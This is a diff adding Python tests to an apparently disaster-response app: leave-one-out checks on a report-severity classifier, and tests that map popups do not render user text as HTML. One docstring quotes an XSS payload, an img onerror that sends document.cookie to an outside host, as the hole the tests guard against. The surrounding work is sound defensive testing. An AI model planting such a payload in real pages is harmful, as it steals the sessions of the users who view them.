@@ -2286,6 +2286,83 @@ class TestEquipmentLexicon:
         assert result.equipment_reasons.get("chainsaw")
 
 
+class TestTheClassifierIsMeasuredNotAssumed:
+    """Hold out one report, retrain on the rest, predict the held-out one.
+
+    This exists because the obvious way to check a classifier — run it over
+    the corpus it was trained on — reported 100% and was meaningless. Held
+    out properly, naive Bayes alone got 45%, against 36% for always guessing
+    HIGH, and it called "child not breathing properly" a MEDIUM.
+
+    That is what put the severity lexicon in. These tests are the guard rail:
+    if somebody improves the model and the held-out number drops, they find
+    out here rather than in a disaster.
+    """
+
+    @staticmethod
+    def loocv(use_lexicon=True):
+        right = 0
+        for i, (text, gold, _needed) in enumerate(classify.CORPUS):
+            model = classify.NaiveBayes(classify.PRIORITIES)
+            for j, (other, label, _n) in enumerate(classify.CORPUS):
+                if j != i:
+                    model.learn(other, label)
+
+            stated = classify.severity_for(text) if use_lexicon else None
+            if stated is not None:
+                predicted = stated[0]
+            else:
+                scores = model.scores(text)
+                predicted = max(scores, key=scores.get)
+
+            right += predicted == gold
+        return right / len(classify.CORPUS)
+
+    @staticmethod
+    def majority_baseline():
+        counts = Counter(label for _t, label, _n in classify.CORPUS)
+        return counts.most_common(1)[0][1] / len(classify.CORPUS)
+
+    def test_it_beats_guessing_the_most_common_class(self):
+        measured, baseline = self.loocv(), self.majority_baseline()
+        assert measured > baseline + 0.25, (
+            f"held-out {measured:.0%} vs {baseline:.0%} for always guessing "
+            f"the commonest label — the model is barely earning its place")
+
+    def test_it_has_not_regressed(self):
+        # Measured at 75% when the severity lexicon went in. The floor is set
+        # below that so ordinary corpus edits don't fail the build, but a real
+        # regression will.
+        assert self.loocv() >= 0.68
+
+    def test_the_lexicon_is_what_makes_the_difference(self):
+        # If these ever converge, the lexicon has stopped doing anything and
+        # somebody should find out why before deleting it.
+        assert self.loocv(True) > self.loocv(False) + 0.15
+
+    def test_the_lexicon_never_contradicts_a_labelled_report(self):
+        # A phrase that fires on a report labelled something else is a phrase
+        # that is too blunt. "cannot get out" was exactly this — it matched
+        # "cannot get the car out" and called a blocked driveway a HIGH.
+        wrong = [
+            (label, stated[1], text)
+            for text, label, _needed in classify.CORPUS
+            if (stated := classify.severity_for(text)) and stated[0] != label
+        ]
+        assert not wrong, f"lexicon overrides a label: {wrong}"
+
+    def test_the_corpus_is_the_size_the_docs_claim(self):
+        # The docs said 65 for a while. It was 55. Nobody noticed because
+        # nothing checked.
+        claimed = re.findall(
+            r"(\d+)\s+(?:hand-)?labelled reports",
+            (diresq.SCHEMA.parent / "docs" / "model.md"
+             ).read_text(encoding="utf-8"))
+        assert claimed, "model.md no longer states a corpus size"
+        for number in claimed:
+            assert int(number) == len(classify.CORPUS)
+
+
 class TestCapabilityMatching:
     """The classifier says a boat is needed; the board knows who has one.
     Before this they never met."""
@@ -2538,6 +2615,58 @@ class TestServiceWorker:
                   ).read_text(encoding="utf-8")
         assert '"/"' not in source.split("SHELL_FILES")[1].split("]")[0]
         assert "/api/" not in source.split("SHELL_FILES")[1].split("]")[0]
+
+
+class TestMapPopupsDoNotRunUserText:
+    """Jinja escapes everything the server renders. The map is the one place
+    that builds markup in the browser instead, out of JSON, and it is the one
+    place where a report subject can become a <script> tag.
+
+    This nearly shipped: the popup was assembled with a template literal and
+    dropped into bindPopup, so a report titled
+
+        <img src=x onerror="fetch('https://elsewhere/'+document.cookie)">
+
+    would have run in the browser of every coordinator who clicked that pin —
+    and coordinators are the accounts worth stealing. The fix was to build
+    the popup from text nodes. These tests are here so it stays fixed.
+    """
+
+    @staticmethod
+    def source():
+        return (diresq.SCHEMA.parent / "static" / "scripts" / "map.js"
+                ).read_text(encoding="utf-8")
+
+    def test_nothing_on_the_map_is_written_as_raw_html(self):
+        # Matched with the leading dot so the prose in this file's own
+        # comments, which has to name the thing it is warning about, doesn't
+        # trip it. Real use is always a property access or a call.
+        source = self.source()
+        for sink in (".innerHTML", ".outerHTML", ".insertAdjacentHTML("):
+            assert sink not in source, f"{sink} on the map"
+
+    def test_the_popup_is_built_from_text_nodes(self):
+        source = self.source()
+        assert "createTextNode" in source or "textContent" in source, (
+            "the popup is not being built as text any more")
+
+    def test_no_user_text_is_interpolated_into_markup(self):
+        # Every backtick string in the file. If one of them contains both a
+        # tag and a value that came from a person typing, that is the hole.
+        literals = re.findall(r"`[^`]*`", self.source(), re.S)
+        from_users = ("report_subject", "username", "subject", "description")
+        offenders = [
+            lit for lit in literals
+            if "<" in lit and any(field in lit for field in from_users)
+        ]
+        assert not offenders, f"user text inside markup: {offenders}"
+
+    def test_a_failed_responder_fetch_says_so(self):
+        # Without this the map renders looking complete while every responder
+        # pin is silently missing, which is worse than an error.
+        source = self.source()
+        assert ".catch(" in source.split('fetch("/api/responders")')[1], (
+            "responder positions can fail silently")
 
 
 class TestSafetyNotices:
